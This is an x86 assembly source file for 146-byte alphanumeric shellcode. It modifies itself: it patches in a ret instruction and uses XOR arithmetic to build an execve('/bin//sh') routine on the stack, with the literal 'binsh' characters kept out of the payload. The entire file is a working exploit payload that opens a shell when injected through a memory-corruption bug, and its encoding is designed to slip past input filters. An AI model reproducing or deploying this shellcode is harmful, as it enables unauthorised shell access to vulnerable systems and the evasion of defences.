BITS 32
; alpha-numeric shellcode without [BINSHbinsh]
; 146 byte
global _start
_start:
        push eax
        pop ecx ; ecx = instruction address 

prepare_registers:
        push 0x30
        pop eax
        xor al, 0x30 ; eax = 0 

        push eax   ;ecx = 0 
        push eax   ;edx = 0 
        push eax   ;ebx = 0 
        push eax   ;ebp = 0 
        push ecx   ;esi = instrction address 
        push eax   ;edi = 0 
        popad
        dec edx    ;edx = 0xffffffff 

patch_ret:
        ;0x44 ^ 0x78 ^ 0xff == 0xc3 (ret) 
        push edx
        pop eax
        xor al, 0x44
        push 0x30
        pop edx
        dec edx
        dec edx
        dec edx ; edx = 0x2d 
        xor [esi+2*edx+0x37], al ; base + 145 = 0x78 
        push edi
        pop edx
        dec edx ; edx = 0xffffffff 

build_stack:
        ; push 0xff80cd0b 
        push edx
        pop eax
        xor eax, 0x30304332
        xor eax, 0x304f7139
        push eax
        push esp
        pop ecx
        xor [ecx], dh

        ; push 0xb05a5059 
        push edx
        pop eax
        xor eax, 0x35303132
        xor eax, 0x7a6a616b
        push eax
        push esp
        pop ecx
        xor [ecx], dh
        inc ecx
        xor [ecx], dh
        inc ecx
        xor [ecx], dh
        
        ; push 0x50e3896e 
        push edx
        pop eax
        xor eax, 0x31443034
        xor eax, 0x6158465a
        push eax
        push esp
        pop ecx
        xor [ecx], dh
        inc ecx
        inc ecx
        inc ecx
        xor [ecx], dh

        ; push 0x69622f68 
        push edi
        pop eax
        xor eax, 0x30304330
        xor eax, 0x59526c58
        push eax

        ; push 0x68732f2f 
        push edi
        pop eax
        xor eax, 0x30304343
        xor eax, 0x58436c6c
        push eax

        ; push 0x6850c031 
        push edx
        pop eax
        xor eax, 0x30314541
        xor eax, 0x58617a70
        push eax
        push esp
        pop ecx
        xor [ecx], dh
        inc ecx
        inc ecx
        xor [ecx], dh
        inc ecx
        xor [ecx], dh

        push esp

ret:
        db 0x78
